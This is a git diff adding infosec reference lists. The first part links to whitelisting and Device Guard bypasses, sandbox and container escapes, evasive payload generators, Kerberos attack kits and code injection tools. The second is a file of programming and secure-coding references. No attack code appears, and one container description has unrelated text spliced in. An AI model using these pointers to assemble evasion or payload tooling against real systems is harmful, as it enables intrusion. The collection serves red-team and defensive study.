+* [katz.xml](https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8)
+
+  * Downloads Mimikatz From GitHub, Executes Inside of MsBuild.exe
+
+* [SigThief](https://github.com/secretsquirrel/SigThief)
+
+  * Stealing Signatures and Making One Invalid Signature at a Time
+
+### Application Whitelisting
+
+* [Modern Evasion Techniques Jason Lang - Derbycon7](https://www.youtube.com/watch?v=xcA2riLyHtQ&index=6&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+* [Whitelisting Evasion - subTee - Shmoocon 2015](https://www.youtube.com/watch?v=85M1Rw6mh4U)
+* [BinariesThatDoesOtherStuff.txt - api0cradle](https://gist.github.com/api0cradle/8cdc53e2a80de079709d28a2d96458c2)
+* [GreatSCT](https://github.com/GreatSCT/GreatSCT)
+
+  * The project is called Great SCT (Great Scott). Great SCT is an open source
+    project to generate application white list bypasses. This tool is intended
+    for BOTH red and blue team.
+
+* [Backdoor-Minimalist.sct](https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302)
+* [Whitelist Evasion revisited](https://khr0x40sh.wordpress.com/2015/05/27/whitelist-evasion-revisited/)
+* [Bypassing Application Whitelisting by using WinDbg/CDB as a Shellcode Runner](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)
+* [Application Whitelist Bypass Techniques](https://github.com/subTee/ApplicationWhitelistBypassTechniques)
+
+* A Catalog of Application Whitelisting Bypass Techniques - SubTee
+
+* [Whitelist Bypass techniques](https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt)
+* [Shackles, Shims, and Shivs - Understanding Bypass Techniques](http://www.irongeek.com/i.php?page=videos/derbycon6/535-shackles-shims-and-shivs-understanding-bypass-techniques-mirovengi)
+* [Applocker Bypass via Registry Key Manipulation](https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/)
+* [Shackles, Shims, and Shivs - Understanding Bypass Techniques](http://www.irongeek.com/i.php?page=videos/derbycon6/535-shackles-shims-and-shivs-understanding-bypass-techniques-mirovengi)
+* [RunMe.c](https://gist.github.com/hugsy/e5c4ce99cd7821744f95)
+
+  * Trick to run arbitrary command when code execution policy is enforced (i.e.
+    AppLocker or equivalent). Works on Win98 (lol) and up - tested on 7/8
+
+* [$@|sh – Or: Getting a shell environment from Runtime.exec](https://codewhitesec.blogspot.ro/2015/03/sh-or-getting-shell-environment-from.html)
+* [Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)](http://subt0x10.blogspot.sg/2017/04/bypass-application-whitelisting-script.html)
+* [Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations](http://subt0x10.blogspot.sg/2017/04/bypassing-application-whitelisting.html)
+* [Window Signed Binary](https://github.com/vysec/Windows-SignedBinary)
+* [MS Signed mimikatz in just 3 steps](https://github.com/secretsquirrel/SigThief)
+
+### DeviceGuard Bypass
+
+* [Window 10 Device Guard Bypass](https://github.com/tyranid/DeviceGuardBypasses)
+* [Defeating Device Guard: A look into CVE-2017-0007](https://enigma0x3.net/2017/04/03/defeating-device-guard-a-look-into-cve-2017-0007/)
+
+### Sandbox Bypass/Escape
+
+* [Sandboxes from a pen tester’s view - Rahul Kashyap](http://www.irongeek.com/i.php?page=videos/derbycon3/4303-sandboxes-from-a-pen-tester-s-view-rahul-kashyap)
+
+  * Description: In this talk we’ll do an architectural decomposition of
+    application sandboxing technology from a security perspective. We look at
+    various popular sandboxes such as Google Chrome, Adobe ReaderX, Sandboxie
+    amongst others and discuss the limitations of each technology and it’s
+    implementation. Further, we discuss in depth with live exploits how to break
+    out of each category of sandbox by leveraging various kernel and user mode
+    exploits – something that future malware could leverage. Some of these
+    exploit vectors have not been discussed widely and awareness is important.
+
+### chroot
+
+* [chw00t: chroot escape tool](https://github.com/earthquake/chw00t)
+* [Breaking Out of a Chroot Jail Using PERL](http://pentestmonkey.net/blog/chroot-breakout-perl)
+
+### ssh
+
+* [ssh environment - circumvention of restricted shells](http://www.opennet.ru/base/netsoft/1025195882_355.txt.html)
+
+### Adobe Sandbox
+
+* [Adobe Sandbox: When the Broker is Broken - Peter Vreugdenhill](https://cansecwest.com/slides/2013/Adobe%20Sandbox.pdf)
+
+### Python Sandbox
+
+* [Escaping a Python sandbox with a memory corruption bug](https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5)
+* [Breaking out of secured Python environments](http://tomforb.es/breaking-out-of-secured-python-environments)
+* [Sandboxed Execution Environment ](http://pythonhosted.org/python-see)
+  [Documentation](http://pythonhosted.org/python-see)
+
+  * Sandboxed Execution Environment (SEE) is a framework for building test
+    automation in secured Environments. The Sandboxes, provided via libvirt, are
+    customizable allowing high degree of flexibility. Different type of
+    Hypervisors (Qemu, VirtualBox,LXC) can be employed to run the Test
+    Environments.
+
+* [Usermode Sandboxing](http://www.malwaretech.com/2014/10/usermode-sandboxing.html)
+
+### Citrix/Terminal Services
+
+* [Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks](https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/) \*
+* [Breaking Out of Citrix and other Restricted Desktop Environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
+
+### Virtualbox
+
+* [VirtualBox Detection Via WQL Queries](http://waleedassar.blogspot.com/)
+* [Bypassing VirtualBox Process Hardening on Windows](https://googleprojectzero.blogspot.com/2017/08/bypassing-virtualbox-process-hardening.html)
+* [VBoxHardenedLoader](https://github.com/hfiref0x/VBoxHardenedLoader)
+
+  * VirtualBox VM detection mitigation loader
+
+### Payloads/Stuff/Idk
+
+### HTA
+
+* [genHTA](https://github.com/vysec/GenHTA)
+
+* Generates anti-sandbox analysis HTA files without payloads
+
+* [morpHTA](https://github.com/vysec/MorphHTA)
+
+  * Morphing Cobalt Strike's evil.HTA
+
+### LNK Files
+
+* [LNKUp](https://github.com/Plazmaz/LNKUp)
+
+  * Generates malicious LNK file payloads for data exfiltration
+
+* [Embedding reverse shell in .lnk file or Old horse attacks](http://onready.me/old_horse_attacks.html)
+* [WsgiDAV](https://github.com/mar10/wsgidav)
+
+  * WsgiDAV is a generic WebDAV server written in Python and based on WSGI.
+
+* [Pupy](https://github.com/n1nj4sec/pupy)
+
+  * Pupy is a remote administration tool with an embeded Python interpreter,
+    allowing its modules to load python packages from memory and transparently
+    access remote python objects. The payload is a reflective DLL and leaves no
+    trace on disk
+
+* [VBad](https://github.com/Pepitoh/VBad)
+
+  * VBad is fully customizable VBA Obfuscation Tool combined with an MS Office
+    document generator. It aims to help Red & Blue team for attack or defense.
+
+* [Winpayloads](https://github.com/nccgroup/Winpayloads)
+
+  * Undetectable Windows Payload Generation with extras Running on Python 2.7
+
+* [Payload Generation with CACTUSTORCH](https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/)
+* [SCT-obfuscator](https://github.com/Mr-Un1k0d3r/SCT-obfuscator)
+
+  * SCT payload obfuscator. Rename variables and change harcoded char value to
+    random one.
+
+* [Winpayloads](https://github.com/nccgroup/Winpayloads)
+
+  * Undetectable Windows Payload Generation with extras Running on Python2.7
+
+### Kerberos Related
+
+#### General
+
+* [Attacking Microsoft Kerberos: Kicking the Guard Dog of Hades](https://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin)
+
+  * Kerberos- besides having three heads and guarding the gates of hell-
+    protects services on Microsoft Windows Domains. Its use is increasing due to
+    the growing number of attacks targeting NTLM authentication. Attacking
+    Kerberos to access Windows resources represents the next generation of
+    attacks on Windows authentication.In this talk Tim will discuss his research
+    on new attacks against Kerberos- including a way to attack the credentials
+    of a remote service without sending traffic to the service as well as
+    rewriting tickets to access systems.He will also examine potential
+    countermeasures against Kerberos attacks with suggestions for mitigating the
+    most common weaknesses in Windows Kerberos deployments.
+
+* [Et tu - Kerberos?](https://www.irongeek.com/i.php?page=videos/derbycon4/t109-et-tu-kerberos-christopher-campbell)
+
+  * For over a decade we have been told that Kerberos is the answer to
+    Microsoft’s authentication woes and now we know that isn’t the case. The
+    problems with LM and NTLM are widely known- but the problems with Kerberos
+    have only recently surfaced. In this talk we will look back at previous
+    failures in order to look forward. We will take a look at what recent
+    problems in Kerberos mean to your enterprise and ways you could possibly
+    mitigate them. Attacks such as Spoofed-PAC- Pass-the-Hash- Golden Ticket-
+    Pass-the-Ticket and Over-Pass-the-Ticket will be explained. Unfortunately-
+    we don’t really know what is next – only that what we have now is broken.
+
+* [Abusing Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf)
+
+### Tools
+
+* [PyKEK](https://github.com/bidord/pykek)
+
+  * PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate
+    KRB5-related data. (Still in development)
+
+### Docker & Containers
+
+* [Vulnerable Docker VM](https://www.notsosecure.com/vulnerable-docker-vm/)
+
+* For practicing pen testing docker instances
+
+* [Is it possible to escalate privileges and escaping from a Docker container? - StackOverflow](https://security.stackexchange.com/questions/152978/is-it-possible-to-escalate-privileges-and-escaping-from-a-docker-container)
+* [The Dangers of Docker.sock](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)
+* [Abusing Privileged and Unprivileged Linux Containers - nccgroup](https://www.nccgroup.trust/uk/our-research/abusing-privileged-and-unprivileged-linux-containers/)
+* [Understanding and Hardening Linux Containers - nccgroup](https://www.nccgroup.trust/uk/our-research/understanding-and-hardening-linux-containers/)
+
+  * Operating System virtualisation is an attractive feature foThis project
+    provides a command line tool called nms that recreates the famous data
+    decryption effect seen on screen in the 1992 hacker movie Sneakers. For
+    reference, you can see this effect at 0:35 in this movie clip.r efficiency,
+    speed and modern application deployment, amid questionable security. Recent
+    advancements of the Linux kernel have coalesced for simple yet powerful OS
+    virtualisation via Linux Containers, as implemented by LXC, Docker, and
+    CoreOS Rkt among others. Recent container focused start-ups such as Docker
+    have helped push containers into the limelight. Linux containers offer
+    native OS virtualisation, segmented by kernel namespaces, limited through
+    process cgroups and restricted through reduced root capabilities, Mandatory
+    Access Control and user namespaces. This paper discusses these container
+    features, as well as exploring various security mechanisms. Also included is
+    an examination of attack surfaces, threats, and related hardening features
+    in order to properly evaluate container security. Finally, this paper
+    contrasts different container defaults and enumerates strong security
+    recommendations to counter deployment weaknesses-- helping support and
+    explain methods for building high-security Linux containers. Are Linux
+    containers the future or merely a fad or fantasy? This paper attempts to
+    answer that question.
+
+* [Docker: Security Myths, Security Legends - Rory McCune](https://www.youtube.com/watch?v=uQigvjSXMLw)
+
+---
+
+### Code Injection
+
+* [injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings/)
+
+  * Single Visual Studio project implementing multiple DLL injection techniques
+    (actually 7 different techniques) that work both for 32 and 64 bits. Each
+    technique has its own source code file to make it easy way to read and
+    understand.
+
+* [Inject All the Things - Shut up and hack](http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/)
+
+  * Accompanying above project
+
+* [PowerLoaderEX](https://github.com/BreakingMalware/PowerLoaderEx)
+* [Injection on Steroids: Code-less Code Injections and 0-Day Techniques](https://breakingmalware.com/injection-techniques/code-less-code-injections-and-0-day-techniques/)
+* [Injection on Steroids: Code less Code Injections and 0 Day Techniques - Paul Schofield Udi Yavo](https://www.youtube.com/watch?v=0BAaAM2wD4s)
+* [InfectPE](https://github.com/secrary/InfectPE)
+
+  * Using this tool you can inject x-code/shellcode into PE file. InjectPE works
+    only with 32-bit executable files.
+
+* [InjectProc - Process Injection Techniques](https://github.com/secrary/InjectProc)
+* [PowerLoaderEX](https://github.com/BreakingMalware/PowerLoaderEx)
+
+  * Advanced Code Injection Technique for x32 / x64
+
+* [pyrasite](https://github.com/lmacken/pyrasite)
+
+  * Tools for injecting arbitrary code into running Python processes.
+
+### Papers
+
+* [Adapting Software Fault Isolation to Contemporary CPU Architectures](https://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/35649.pdf)
+
+  * Adapting Software Fault Isolation to Contemporary CPU ArchitecturesSoftware
+    Fault Isolation (SFI) is an effective approach to sandboxing binary code of
+    questionable provenance, an interesting use case for native plugins in a Web
+    browser. We present software fault isolation schemes for ARM and x86-64 that
+    provide control-flow and memory integrity with average performance overhead
+    of under 5% on ARM and 7% on x86-64. We believe these are the best known SFI
+    implementations for these architectures, with significantly lower overhead
+    than previous systems for similar architectures. Our experience suggests
+    that these SFI implementations benefit from instruction-level parallelism,
+    and have particularly small impact for work- loads that are data
+    memory-bound, both properties that tend to reduce the impact of our SFI
+    systems for future CPU implementations.
+  * https://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/35649.pdf
+
+* [NaCl SFI model on x86-64 systems](https://developer.chrome.com/native-client/reference/sandbox_internals/x86-64-sandbox#x86-64-sandbox)
+
+  * This document addresses the details of the Software Fault Isolation (SFI)
+    model for executable code that can be run in Native Client on an x86-64
+    system
+
+* [Exploiting the DRAM rowhammer bug to gain kernel privileges](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)
diff --git a/source/Programming-Languages-Libs-Courses-References.md b/source/Programming-Languages-Libs-Courses-References.md
new file mode 100644
index 0000000..90d958a
--- /dev/null
+++ b/source/Programming-Languages-Libs-Courses-References.md
@@ -0,0 +1,623 @@
+#Programming Language Courses and References
+
+### TOC
+
+* [General](#general)
+* [Source Code Analysis](#sca)
+* [ASM](#asm)
+* [Android](#android)
+* [Bash](#bash)
+* [C/C++](#c)
+* [Go](#go)
+* [Java](#java)
+* [.Net](#net)
+* [Perl](#perl)
+* [Powershell](#power)
+* [Python](#python)
+* [Ruby](#ruby)
+* [Papers](#papers)
+
+### Cull
+
+* http://www.irongeek.com/i.php?page=videos/derbycon4/t205-code-insecurity-or-code-insecurity-mano-dash4rk-paul \*http://en.cppreference.com/w/c
+* [Hide data inside pointers](http://arjunsreedharan.org/post/105266490272/hide-data-inside-pointers)
+* [Alamofire](https://github.com/Alamofire/Alamofire)
+
+  * Alamofire is an HTTP networking library written in Swift.
+
+* [plog](https://github.com/SergiusTheBest/plog)
+* Portable, simple and extensible C++ logging library
+* [Dynamic Source Code Generation and Compilation](https://docs.microsoft.comen-us/dotnet/framework/reflection-and-codedom/dynamic-source-code-generation-and-compilation)
+
+### General
+
+The content here is just stuff I've come across or think would be useful to
+someone in infosec. It is not to be taken as anything beyond a suggestion about
+stuff.
+
+* [Secure Coding Standards - Android](https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=111509535)
+* [Secure Coding Cheat Sheet - OWASP](https://www.owasp.org/index.php/Secure_Coding_Cheat_Sheet)
+* [What a C programmer should know about memory](http://marek.vavrusa.com/c/memory/2015/02/20/memory/)
+* [How to be a Programmer: Community Version](https://github.com/braydie/HowToBeAProgrammer)
+
+  * To be a good programmer is difficult and noble. The hardest part of making
+    real a collective vision of a software project is dealing with one's
+    coworkers and customers. Writing computer programs is important and takes
+    great intelligence and skill. But it is really child's play compared to
+    everything else that a good programmer must do to make a software system
+    that succeeds for both the customer and myriad colleagues for whom he or she
+    is partially responsible. In this essay I attempt to summarize as concisely
+    as possible those things that I wish someone had explained to me when I was
+    twenty-one.
+
+* [Loop Patterns](https://users.cs.duke.edu/~ola/patterns/plopd/loops.html#loop-and-a-half)
+* [Learn_X_in_Y_Minutes](http://learnxinyminutes.com/)
+* [Hyperpolyglot](http://hyperpolyglot.org/)
+* [App Ideas - Stuff to build out ot improve your programming skills](https://github.com/tastejs/awesome-app-ideas)
+* [Secure iOS application development](https://github.com/felixgr/secure-ios-app-dev)
+
+  * This guide is a collection of the most common vulnerabilities found in iOS
+    applications. The focus is on vulnerabilities in the applications’ code and
+    only marginally covers general iOS system security, Darwin security,
+    C/ObjC/C++ memory safety, or high-level application security. Nevertheless,
+    hopefully the guide can serve as training material to iOS app developers
+    that want to make sure that they ship a more secure app. Also, iOS security
+    reviewers can use it as a reference during assessments.
+
+* [Mostly Adequate Guide](https://drboolean.gitbooks.io/mostly-adequate-guide/)
+
+  * This is a book on the functional paradigm in general. We'll use the world's
+    most popular functional programming language: JavaScript. Some may feel this
+    is a poor choice as it's against the grain of the current culture which, at
+    the moment, feels predominately imperative.
+
+* [Six Stages of debugging](http://plasmasturm.org/log/6debug/)
+
+```
+    1. That can’t happen.
+    2. That doesn’t happen on my machine.
+    3. That shouldn’t happen.
+    4. Why does that happen?
+    5. Oh, I see.
+    6. How did that ever work?
+```
+
+### Talks/Videos
+
+* [Big picture software testing unit testing, Lean Startup, and everything in between PyCon 2017](https://www.youtube.com/watch?v=Vaq_e7qUA-4&feature=youtu.be&t=63s)
+* [Boundaries - By Gary Bernhardt from SCNA 2012](https://www.destroyallsoftware.com/talks/boundaries)
+
+  * This talk is about using simple values (as opposed to complex objects) not
+    just for holding data, but also as the boundaries between components and
+    subsystems. It moves through many topics: functional programming;
+    mutability's relationship to OO; isolated unit testing with and without test
+    doubles; and concurrency, to name some bar. The "Functional Core, Imperative
+    Shell" screencast mentioned at the end is available as part of season 4 of
+    the DAS catalog.
+
+* [Big picture software testing unit testing, Lean Startup, and everything in between PyCon 2017](https://www.youtube.com/watch?v=Vaq_e7qUA-4&feature=youtu.be&t=63s)
+
+  * There are many ways you can test your software: unit testing, manual
+    testing, end-to-end testing, and so forth. Take a step back and you'll
+    discover even more form of testing, many of them very different in their
+    goals: A/B testing, say, where you see which of two versions of your website
+    results in more signups or ad clicks. How do these forms of testing differ,
+    how do they relate to each other? How do you choose which kind of testing to
+    pursue, given limited time and resources? How do you deal with strongly held
+    yet opposite views arguing either that a particular kind of testing is
+    essential or that it's a waste time? This talk will provide you with a
+    model, a way to organize all forms of testing and understand what exactly
+    they provide, and why. Once you understand the model you will be able to
+    choose the right form of testing for _your_ situation and goals.
+
+* [RailsConf 2015 - Nothing is Something](https://www.youtube.com/watch?v=OMPfEXIlTVE)
+
+### Articles
+
+* [Counterfeit Object-oriented Programming](http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf)
+* [Getting Started with WinDbg part 1](http://blog.opensecurityresearch.com/2013/12/getting-started-with-windbg-part-1.html)
+* [An Introduction to Debugging the Windows Kernel with WinDbg](http://www.contextis.com/resources/blog/introduction-debugging-windows-kernel-windbg/)
+* [Hide data inside pointers](http://arjunsreedharan.org/post/105266490272/hide-data-inside-pointers)
+* [Record and Replay Debugging with Firefox](https://developer.mozilla.org/en-US/docs/Mozilla/Debugging/Record_and_Replay_Debugging_Firefox)
+* [rr](https://github.com/mozilla/rr)
+
+  * rr is a lightweight tool for recording and replaying execution of
+    applications (trees of processes and threads). More information about the
+    project, including instructions on how to install, run, and build rr, is at
+    http://rr-project.org.w
+
+### sca Source Code Analysis
+
+* Tools
+
+  * [RIPS](http://rips-scanner.sourceforge.net/)
+    * RIPS is a tool written in PHP to find vulnerabilities in PHP applications
+      using static code analysis. By tokenizing and parsing all source code
+      files RIPS is able to transform PHP source code into a program model and
+      to detect sensitive sinks (potentially vulnerable functions) that can be
+      tainted by user input (influenced by a malicious user) during the program
+      flow. Besides the structured output of found vulnerabilities RIPS also
+      offers an integrated code audit framework for further manual analysis.
+  * [PHPMD - PHP Mess Detector](http://phpmd.org/about.html) \* What PHPMD does
+    is: It takes a given PHP source code base and look for several potential
+    problems within that source. These problems can be things like: Possible
+    bugs; Suboptimal code; Overcomplicated expressions; Unused parameters,
+    methods, properties.
+  * [PMD](http://pmd.sourceforge.net/)
+    * PMD is a source code analyzer. It finds common programming flaws like
+      unused variables, empty catch blocks, unnecessary object creation, and so
+      forth. It supports Java, JavaScript, PLSQL, Apache Velocity, XML, XSL.
+      Additionally it includes CPD, the copy-paste-detector. CPD finds
+      duplicated code in Java, C, C++, C#, PHP, Ruby, Fortran, JavaScript,
+      PLSQL, Apache Velocity, Ruby, Scala, Objective C, Matlab, Python, Go.
+  * [Graudit](http://www.justanotherhacker.com/projects/graudit.html)
+    * Graudit is a simple script and signature sets that allows you to find
+      potential security flaws in source code using the GNU utility grep. It's
+      comparable to other static analysis applications like RATS, SWAAT and
+      flaw-finder while keeping the technical requirements to a minimum and
+      being very flexible.
+  * [PumaScan](https://github.com/pumasecurity/puma-scan)
+    * provides real time, continuous source code analysis
+  * [How to find 56 potential vulnerabilities in FreeBSD code in one evening](https://www.viva64.com/en/b/0496/)
+  * [Phan](https://github.com/phan/phan)
+    * Phan is a static analyzer for PHP. Phan prefers to avoid false-positives
+      and attempts to prove incorrectness rather than correctness.
+
+### Assembly x86/x64/ARM
+
+* x86/x64/ARM Assembly
+
+  * [x86 Assembly - Wikipedia](https://en.wikipedia.org/wiki/X86)
+  * [x86-64 Assembly - Wikipedia](https://en.wikipedia.org/wiki/X86-64)
+  * [Mov is turing complete](http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf)
+
+* Learning
+
+  * [x86 Assembly Guide/Reference - Wikibooks](https://en.wikibooks.org/wiki/X86_Assembly)
+    * Introduction for those who don’t know ASM and a reference for those that
+      do.
+  * [Guide to x86 Assembly](http://www.cs.virginia.edu/~evans/cs216/guides/x86.html)
+  * [Intro to x86 calling conventions](http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html)
+  * [Reading ASM](http://cseweb.ucsd.edu/classes/sp11/cse141/pdf/02/S01_x86_64.key.pdf)
+  * [Machine-Level Representation of Programs](https://2013.picoctf.com//docs/asmhandout.pdf)
+  * [Intro to x86 - OpensSecurityTraining.info](http://opensecuritytraining.info/IntroX86.html)
+  * [cgasm](https://github.com/bnagy/cgasm)
+    * cgasm is a standalone, offline terminal-based tool with no dependencies
+      that gives me x86 assembly documentation. It is pronounced "SeekAzzem".
+  * [x86 Assembly Crash Course](https://www.youtube.com/watch?v=75gBFiFtAb8)
+  * [Learning assembly for linux-x64](https://github.com/0xAX/asm)
+  * [Introduction to writing x86 assembly code in Visual Studio](http://lallouslab.net/2014/07/03/introduction-to-writing-x86-assembly-code-in-visual-studio/)
+  * [Introduction to writing x64 assembly in Visual Studio](http://lallouslab.net/2016/01/11/introduction-to-writing-x64-assembly-in-visual-studio/)
+  * [x86 Call/Return Protocol](http://pages.cs.wisc.edu/~remzi/Classes/354/Fall2012/Handouts/Handout-CallReturn.pdf)
+
+* Reference
+
+  * [Nasm x86 reference](https://www.cs.uaf.edu/2006/fall/cs301/support/x86/)
+  * [x86 Assembly Guide/Reference - Wikibooks](https://en.wikibooks.org/wiki/X86_Assembly)
+
+    * Introduction for those who don’t know ASM and a reference for those that
+      do.
+
+  * [x86 Disassembly/Calling Conventions](https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Conventions)
+
+  * [x86 Disassembly/Calling Convention Examples](https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Convention_Examples)
+  * [sandpile.org](http://www.sandpile.org/)
+
+    * The world's leading source for technical x86 processor information. \_
+      Good source of reference docs/images for x86 ASM
+
+  * [Walkthrough: Creating and Using a Dynamic Link Library (C++)](https://msdn.microsoft.com/en-us/library/ms235636.aspx)
+
+  * [Intel x86 Assembler Instruction Set Opcode Table](http://sparksandflames.com/files/x86InstructionChart.html)
+
+* Videos
+
+  * [Introduction Video Series(6) to x86 Assembly](https://www.youtube.com/watch?v=qn1_dRjM6F0&list=PLPXsMt57rLthf58PFYE9gOAsuyvs7T5W9)
+  * [Intro to x86 - Derbycon5](http://www.irongeek.com/i.php?page=videos/derbycon5/stable34-intro-to-x86-stephanie-preston)
+
+* Tools
+
+  * [WinREPL](https://github.com/zerosum0x0/WinREPL)
+    * x86 and x64 assembly "read-eval-print loop" shell for Windows
+  * [aslrepl](https://github.com/enferex/asrepl)
+    * asrepl is an assembly based REPL. The REPL processes each line of user
+      input, the output can be witnessed by issuing the command 'regs' and
+      looking at the register state.
+
+### Android (Kotlin/Android Java)
+
+* [Kotlin - Wikipedia](<https://en.wikipedia.org/wiki/Kotlin_(programming_language)>)
+* [Java - Wikipedia](<https://en.wikipedia.org/wiki/Java_(programming_language)>)
+* Learn
+
+  * [Android Secure Coding Standard](https://www.securecoding.cert.org/confluence/display/android/Android+Secure+Coding+Standard)
+
+* Reference
+* Tools
+
+  * [java-aes-crypto (Android class)](https://github.com/tozny/java-aes-crypto)
+    * A simple Android class for encrypting & decrypting strings, aiming to
+      avoid the classic mistakes that most such classes suffer from.
+  * [smalisca](https://github.com/dorneanu/smalisca)
+    * Static Code Analysis for Smali files
+
+### Bash
+
+* [Bash - GNU](https://www.gnu.org/software/bash/)
+* [Bash (Unix shell) - Wikipedia](<https://en.wikipedia.org/wiki/Bash_(Unix_shell)>)
+* Learn
+
+  * [BASH Programming - Introduction HOW-TO - tldp](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html)
+  * [Community Bash Style Guide](https://github.com/azet/community_bash_style_guide)
+  * [The Bash Guide - A quality-driven guide through the shell's many features.](https://guide.bash.academy)
+
+* Reference _
+  [Bash Reference Manual](https://tiswww.case.edu/php/chet/bash/bashref.html) _
+  [An A-Z Index of the Bash command line for Linux. - ss64](https://ss64.com/bash/) \*
+  [bash(1) - Linux man page](https://linux.die.net/man/1/bash)
+* Tools
+* Scripts
+
+### C/C++
+
+* [C (programming language) - Wikipedia](<https://en.wikipedia.org/wiki/C_(programming_language)>)
+* [C++ - Wikipedia](https://en.wikipedia.org/wiki/C%2B%2B)
+* [C++ Homepage](https://isocpp.org/)
+* Learn
+
+  * [Stanford C 101](http://cslibrary.stanford.edu/101/EssentialC.pdf)
+    * Stanford CS Education Library: A 45 page summary of the C language.
+      Explains all the common features and techniques for the C language. The
+      coverage is pretty quick, so it is most appropriate for someone with some
+      programming background who needs to see how C works. Topics include
+      variables, int types, floating point types, promotion, truncation,
+      operators, control structures (if, while, for), functions, value
+      parameters, reference parameters, structs, pointers, arrays, the
+      pre-processor, and the standard C library functions. (revised 4/2003)
+    * [Homepage](http://cslibrary.stanford.edu/101/)
+  * [Stanford C Pointers and Memory](http://cslibrary.stanford.edu/102/PointersAndMemory.pdf)
+    * Stanford CS Education Library: a 31 page introduction to programming with
+      pointers and memory in C, C++ and other languages. Explains how pointers
+      and memory work and how to use them -- from the basic concepts through all
+      the major programming techniques. Can be used as an introduction to
+      pointers for someone with basic programming experience or as a quick
+      review. Many advanced programming and debugging problems only make sense
+      with a solid understanding of pointers and memory -- this document tries
+      to provide that understanding.
+  * [Homepage](http://cslibrary.stanford.edu/102/)
+  * [How to C in 2016](https://matt.sh/howto-c)
+  * [A critique of "How to C in 2016" by Matt](https://github.com/Keith-S-Thompson/how-to-c-response)
+  * [C Right-Left Rule](http://ieng9.ucsd.edu/~cs30x/rt_lt.rule.html)
+
+* Reference
+
+  * [C++ TutorialsPoint](https://www.tutorialspoint.com/cplusplus/)
+  * [C Function Call Conventions and the Stack](https://archive.is/o2nD5)
+  * [What a C programmer should know about memory](http://marek.vavrusa.com/c/memory/2015/02/20/memory/)
+  * [Cplusplus.com](http://www.cplusplus.com/)
+
+* Security
+
+  * [SEI CERT C Coding Standard](https://www.securecoding.cert.org/confluence/display/seccode/SEI+CERT+Coding+Standards)
+  * [SEI CERT C++ Coding Standard](https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637)
+  * [Vulnerabilities in C : When integers go bad!](https://blog.feabhas.com/2014/10/vulnerabilities-in-c-when-integers-go-bad/)
+
+* Tools
+
+### C
+
+* [Compiling C# Code at Runtime](https://www.codeproject.com/Tips/715891/Compiling-Csharp-Code-at-Runtime)
+
+### Go
+
+* [Go Programming Language](https://golang.org/)
+* [GAS - Go AST Scanner](https://github.com/GoASTScanner/gas)
+
+  * Inspects source code for security problems by scanning the Go AST.
+
+### Java
+
+* [Java - Wikipedia](<https://en.wikipedia.org/wiki/Java_(programming_language)>)
+* Learn
+
+  * [SEI CERT Oracle Coding Standard for Java](https://www.securecoding.cert.org/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java)
+  * [Protect Your Java Code - Through Obfuscators and Beyond](https://www.excelsior-usa.com/articles/java-obfuscators.html)
+
+* Reference
+* Tools
+
+  * [Serianalyzer](https://github.com/mbechler/serianalyzer)
+    * A static byte code analyzer for Java deserialization gadget research
+
+### Lisp
+
+* [Lisp - Wikipedia](<https://en.wikipedia.org/wiki/Lisp_(programming_language)>)
+* [Common Lisp](https://common-lisp.net/)
+* [What makes lisp macros so special - StackOverflow](https://stackoverflow.com/questions/267862/what-makes-lisp-macros-so-special)
+* Learn
+
+  * [Lisp - TutorialsPoint](https://www.tutorialspoint.com/lisp/)
+
+* Reference
+* Tools
+* Other
+
+  * [Lisp - Paul Graham](http://www.paulgraham.com/lisp.html)
+
+### .NET
+
+* [Book of the Runtime (BOTR) for the .NET Runtime](https://github.com/dotnet/coreclr/tree/master/Documentation/botr)
+
+  * This contains a collection of articles about the non-trivial internals of
+    the .NET Runtime. Its intended audience are people actually modifying the
+    code or simply wishing to have a deep understanding of the runtime.
+
+### Perl
+
+* [Perl Programming Language](https://www.perl.org/)
+* [Perl - Wikipedia](https://en.wikipedia.org/wiki/Perl)
+
+  * [Perl & Linguistics](http://world.std.com/~swmcd/steven/perl/linguistics.html)
+  * [SEI CERT Perl Coding Standard](https://www.securecoding.cert.org/confluence/display/perl/SEI+CERT+Perl+Coding+Standard)
+  * [Introduction to Perl](http://www.perl.com/pub/2000/10/begperl1.html)
+
+* Reference
+
+  * [Perl Docs](https://perldoc.perl.org/)
+
+* Tools
+
+### Lua
+
+* [Lua](https://www.lua.org/)
+
+  * Official Homepage
+
+* [Lua - Getting Started](https://www.lua.org/start.html)
+* Learn
+
+  * [Learn X in Y minutes, Where X=Lua](https://learnxinyminutes.com/docs/lua/)
